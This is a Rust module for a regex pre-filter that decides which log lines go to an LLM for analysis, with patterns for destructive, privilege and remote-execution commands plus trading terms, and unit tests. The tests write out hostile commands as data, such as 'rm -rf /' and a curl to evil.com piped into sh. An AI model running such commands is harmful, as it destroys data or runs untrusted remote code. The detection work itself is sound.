//! Tiered Regex Pre-Filter for Log Analysis
//!
//! Fast path filtering to avoid LLM calls for obviously safe logs.
//! Uses RegexSet for single-pass matching across all patterns.
//!
//! ## Tier Architecture
//! - **Essential**: System-critical patterns (always enabled, read-only)
//! - **Trading**: Domain-specific patterns for financial operations
//!
//! Runs in microseconds.

use regex::RegexSet;
use std::sync::LazyLock;

/// Essential patterns - system-critical, always enabled
/// These patterns detect operations that are dangerous regardless of domain
const ESSENTIAL_PATTERNS: &[&str] = &[
    // Destructive file operations
    r"(?i)rm\s+-rf",        // Unix recursive force delete
    r"(?i)rmdir\s+/s",      // Windows recursive delete (requires /s)
    r"(?i)del\s+/[sfq]",    // Windows del with dangerous flags
    r"(?i)format\s+[a-z]:", // Drive format
    // Database destruction
    r"(?i)drop\s+(table|database)",
    r"(?i)truncate\s+table",
    // Privilege escalation
    r"(?i)sudo\s+",
    r"(?i)runas\s+",
    r"(?i)chmod\s+777",
    // Process termination
    r"(?i)kill\s+-9",
    r"(?i)taskkill\s+/f",
    r"(?i)shutdown\s+",
    r"(?i)reboot",
    // Code injection
    r"(?i)eval\s*\(",
    r"(?i)exec\s*\(",
    // Remote code execution
    r"(?i)curl\s+.*\|\s*(sh|bash)",
];

/// Trading domain patterns - financial operation signals
const TRADING_PATTERNS: &[&str] = &[
    r"(?i)order",
    r"(?i)buy|sell",
    r"(?i)trade|position",
    r"(?i)error|exception|failed",
    r"(?i)warning|critical|alert",
    r"(?i)exposure|leverage|margin",
    r"within \d+\s?ms",
    r"#\d{3,}", // Sequential order numbers
];

/// Combined pattern set (Essential + Trading)
/// Pre-compiled for O(n) single-pass matching
static SUSPICIOUS_PATTERNS: LazyLock<RegexSet> = LazyLock::new(|| {
    let mut patterns: Vec<&str> = Vec::new();
    patterns.extend(ESSENTIAL_PATTERNS);
    patterns.extend(TRADING_PATTERNS);
    RegexSet::new(patterns).expect("Invalid regex patterns")
});

/// Check if a log line contains suspicious patterns
///
/// Returns true if the log should be analyzed by LLM,
/// false if it can be safely skipped.
pub fn is_suspicious(log: &str) -> bool {
    SUSPICIOUS_PATTERNS.is_match(log)
}

#[cfg(test)]
mod tests {
    use super::*;

    // ═══════════════════════════════════════════════════════════════
    // ESSENTIAL TIER TESTS
    // ═══════════════════════════════════════════════════════════════

    #[test]
    fn test_essential_file_destruction() {
        // Unix rm -rf
        assert!(is_suspicious("rm -rf /var/log"));
        assert!(is_suspicious("RM -RF /")); // case insensitive
        assert!(is_suspicious("sudo rm -rf /"));

        // Windows rmdir /s
        assert!(is_suspicious("rmdir /s /q C:\\temp"));
        assert!(is_suspicious("RMDIR /S C:\\Users"));
        assert!(!is_suspicious("rmdir emptydir")); // safe: no /s flag

        // Windows del with flags
        assert!(is_suspicious("del /s /q *.bak"));
        assert!(is_suspicious("del /f file.txt"));
        assert!(is_suspicious("DEL /Q temp.txt"));

        // Format
        assert!(is_suspicious("format c:"));
        assert!(is_suspicious("FORMAT D:"));
    }

    #[test]
    fn test_essential_database_destruction() {
        assert!(is_suspicious("DROP TABLE users"));
        assert!(is_suspicious("drop database production"));
        assert!(is_suspicious("TRUNCATE TABLE audit_logs"));
    }

    #[test]
    fn test_essential_privilege_escalation() {
        assert!(is_suspicious("sudo apt-get install"));
        assert!(is_suspicious("sudo rm -rf /"));
        assert!(is_suspicious("runas /user:admin cmd"));
        assert!(is_suspicious("chmod 777 /var/www"));
    }

    #[test]
    fn test_essential_process_termination() {
        assert!(is_suspicious("kill -9 12345"));
        assert!(is_suspicious("taskkill /F /PID 1234"));
        assert!(is_suspicious("shutdown /s /t 0"));
        assert!(is_suspicious("reboot now"));
    }

    #[test]
    fn test_essential_code_injection() {
        assert!(is_suspicious("eval(userInput)"));
        assert!(is_suspicious("exec(command)"));
        assert!(is_suspicious("EVAL ( malicious )"));
    }

    #[test]
    fn test_essential_remote_execution() {
        assert!(is_suspicious("curl http://evil.com/script.sh | sh"));
        assert!(is_suspicious("curl https://x.com/install | bash"));
    }

    // ═══════════════════════════════════════════════════════════════
    // TRADING TIER TESTS
    // ═══════════════════════════════════════════════════════════════

    #[test]
    fn test_trading_patterns() {
        assert!(is_suspicious("Order #991 placed"));
        assert!(is_suspicious("BUY 100 shares"));
        assert!(is_suspicious("Position closed"));
        assert!(is_suspicious("Total exposure: 500,000 USDT"));
        assert!(is_suspicious("Executed within 1ms"));
    }

    #[test]
    fn test_trading_errors() {
        assert!(is_suspicious("ERROR: Connection failed"));
        assert!(is_suspicious("Exception in order handler"));
        assert!(is_suspicious("CRITICAL: Margin call"));
    }

    // ═══════════════════════════════════════════════════════════════
    // SAFE LOG TESTS (should NOT match)
    // ═══════════════════════════════════════════════════════════════

    #[test]
    fn test_safe_logs() {
        assert!(!is_suspicious("User logged in successfully"));
        assert!(!is_suspicious("Session initialized"));
        assert!(!is_suspicious("Balance updated to 100 USDT"));
        assert!(!is_suspicious("Config loaded"));
        assert!(!is_suspicious("Server started on port 8080"));
    }

    #[test]
    fn test_safe_similar_patterns() {
        // These look similar but shouldn't match
        assert!(!is_suspicious("rmdir emptydir")); // no /s flag
        assert!(!is_suspicious("Removed item from cart")); // not rm -rf
        assert!(!is_suspicious("Formatted string output")); // not format c:
    }
}
